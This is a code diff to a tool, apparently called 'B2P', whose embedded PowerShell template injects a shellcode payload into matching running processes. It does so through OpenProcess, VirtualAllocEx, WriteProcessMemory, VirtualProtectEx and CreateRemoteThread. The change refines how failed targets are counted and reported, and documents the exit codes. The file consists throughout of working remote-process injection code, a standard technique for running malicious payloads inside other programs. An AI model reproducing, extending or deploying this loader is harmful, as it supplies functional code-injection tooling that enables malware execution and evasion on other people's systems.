@@ -231,6 +231,8 @@ const injectTargetsTpl = `if ($targets.Count -eq 0) {
     exit 5
 }
 $injected = 0
+$failed = 0
+$failCode = 0
 $errCode = 0
 $lastExit = 0
 $threads = @()
@@ -238,7 +240,8 @@ foreach ($proc in $targets) {
     $hProc = [B2PI]::OpenProcess(0x43A, $false, [int]$proc.Id)
     if ($hProc -eq [IntPtr]::Zero) {
         [Console]::Error.WriteLine('B2P: OpenProcess failed for ' + $proc.ProcessName + ' (pid ' + $proc.Id + '), win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
-        if ($errCode -eq 0) { $errCode = 6 }
+        if ($failCode -eq 0) { $failCode = 6 }
+        $failed++
         continue
     }
     try {
@@ -247,38 +250,44 @@ foreach ($proc in $targets) {
         $target64 = ($os64 -and (-not $wow64))
         if ($payload64 -ne $target64) {
             [Console]::Error.WriteLine('B2P: architecture mismatch - payload is ' + $B2P_ARCH + ', target ' + $proc.ProcessName + ' is ' + $(if ($target64) {'64-bit'} else {'32-bit'}))
-            if ($errCode -eq 0) { $errCode = 3 }
+            if ($failCode -eq 0) { $failCode = 3 }
+            $failed++
             continue
         }
         if ($target64 -and (-not $injector64)) {
             [Console]::Error.WriteLine('B2P: a 32-bit PowerShell cannot inject into the 64-bit process ' + $proc.ProcessName)
-            if ($errCode -eq 0) { $errCode = 3 }
+            if ($failCode -eq 0) { $failCode = 3 }
+            $failed++
             continue
         }
         $size = [UIntPtr]::new([uint32]$sc.Length)
         $addr = [B2PI]::VirtualAllocEx($hProc, [IntPtr]::Zero, $size, 0x3000, 0x04)
         if ($addr -eq [IntPtr]::Zero) {
             [Console]::Error.WriteLine('B2P: VirtualAllocEx failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
-            if ($errCode -eq 0) { $errCode = 4 }
+            if ($failCode -eq 0) { $failCode = 4 }
+            $failed++
             continue
         }
         $written = [UIntPtr]::Zero
         if (-not [B2PI]::WriteProcessMemory($hProc, $addr, $sc, $size, [ref]$written)) {
             [Console]::Error.WriteLine('B2P: WriteProcessMemory failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
-            if ($errCode -eq 0) { $errCode = 4 }
+            if ($failCode -eq 0) { $failCode = 4 }
+            $failed++
             continue
         }
         $old = [uint32]0
         if (-not [B2PI]::VirtualProtectEx($hProc, $addr, $size, 0x20, [ref]$old)) {
             [Console]::Error.WriteLine('B2P: VirtualProtectEx failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
-            if ($errCode -eq 0) { $errCode = 4 }
+            if ($failCode -eq 0) { $failCode = 4 }
+            $failed++
             continue
         }
         $rtid = [uint32]0
         $hThread = [B2PI]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$rtid)
         if ($hThread -eq [IntPtr]::Zero) {
             [Console]::Error.WriteLine('B2P: CreateRemoteThread failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
-            if ($errCode -eq 0) { $errCode = 4 }
+            if ($failCode -eq 0) { $failCode = 4 }
+            $failed++
             continue
         }
         $injected++
@@ -289,8 +298,11 @@ foreach ($proc in $targets) {
     }
 }
 if ($injected -eq 0) {
-    if ($errCode -eq 0) { $errCode = 4 }
-    exit $errCode
+    if ($failCode -eq 0) { $failCode = 4 }
+    exit $failCode
+}
+if ($failed -gt 0) {
+    [Console]::Error.WriteLine('B2P: warning: ' + $failed + ' of ' + $targets.Count + ' matching processes could not be injected (see above), continuing with ' + $injected)
 }
 @WAIT_ALL@
 if ($errCode -ne 0) { exit $errCode }
@@ -368,6 +380,10 @@ thread was allowed to finish; container errors: 2 = payload data or
 marker damaged, 3 = architecture mismatch, 4 = memory API failure,
 5 = no matching target process, 6 = target process could not be opened,
 7 = timed out waiting for the payload thread.
+With several matching processes, a target that cannot be opened or written
+to is reported as a warning and leaves the exit code alone as long as at
+least one target was injected; codes 3, 4 and 6 describe a run in which
+nothing could be injected.
 `)
 }
 
